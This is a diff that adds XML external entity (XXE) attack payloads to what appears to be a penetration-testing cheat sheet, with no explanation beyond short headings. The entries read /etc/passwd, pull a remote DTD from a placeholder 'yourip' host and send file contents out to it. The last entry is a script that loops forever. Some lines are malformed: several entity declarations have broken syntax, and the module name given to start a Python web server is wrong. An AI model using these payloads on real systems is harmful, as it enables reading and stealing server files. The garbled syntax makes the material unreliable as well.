@@ -1,3 +1,23 @@
+## Create a custom entity within the XML document - Upload it and open python -m HTTPSimpleServer
+<!DOCTYPE testxxe [<!ENTITY xxe SYSTEM "http://youip/file.txt">]> <foo>&xxe</foo>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+
+## Define your own tags - need to have attributes - DTD too
+<!DOCTYPE testxxe [<!ENTITY %get SYSTEM "file:///etc/passwd">]>
+		   <!ENTITY %dtd SYSTEM "http://yourip:8080/payload.dtd">
+		   %get %dtd;]>
+
+## payload.dtd
+<!ENTITY %data SYSTEM "file:///etc/passwd">
+<!ENTITY %param1 <!ENTITY exfil SYSTEM 'http://yourip:8080/?%data;'>">
+
+## Inject the payload in the xml file before it is uploaded
+<!DOCTYPE testxxe [<!ENTITY %get SYSTEM "file:///etc/passwd">
+		   <!ENTITY %dtd SYSTEM "http://yourip:8080/payload.dtd">
+		   %get %dtd;]>
+
 ## After XML Declaration
 
 <![CDATA[<script>var n=0;while(true){n++;}</script>]]>
